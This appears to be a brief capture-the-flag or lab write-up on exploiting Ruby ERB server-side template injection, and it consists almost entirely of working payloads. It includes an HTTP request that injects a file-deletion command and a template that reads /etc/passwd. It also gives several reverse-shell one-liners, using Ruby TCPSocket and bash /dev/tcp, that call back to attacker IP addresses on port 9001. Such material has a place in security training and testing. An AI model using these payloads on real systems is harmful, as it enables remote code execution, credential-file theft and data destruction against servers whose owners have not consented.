I used this payload to do the asked task using command injection:
```
GET /?message=<%= IO.popen('rm morale.txt').read %> HTTP/2
```

Lot of reading
https://docs.ruby-lang.org/en/2.3.0/ERB.html
https://github.com/payloadbox/ssti-payloads


I checked some and the ERB injection allows:

```erb
<%= File.open('/etc/passwd').read %>
```


Initially I tried to launch a reverse shell from the vulnerable Ruby/ERB template to your attack machine.

##  Ruby Reverse Shell Payload (SSTI)

```erb
<%= require 'socket'; s=TCPSocket.new("10.17.19.181",9001);while(cmd=s.gets);IO.popen(cmd,"r"){|io|s.print io.read}end %>
```

```erb
<%= eval "s=TCPSocket.new('10.10.14.42',9001);loop{c=s.gets;IO.popen(c){|io|s.puts io.read}}" %>
```

##  Alternative Ruby RCE Vectors

- **System call:**
    ```erb
    <%= system("bash -i >& /dev/tcp/10.10.14.42/9001 0>&1") %>
    ```

- **Backticks:**
    ```erb
    <%= `bash -c 'bash -i >& /dev/tcp/10.10.14.42/9001 0>&1'` %>
    ```

- **IO.spawn variant:**
    ```erb
    <%= IO.popen("bash -i >& /dev/tcp/10.10.14.42/9001 0>&1") %>
    ```
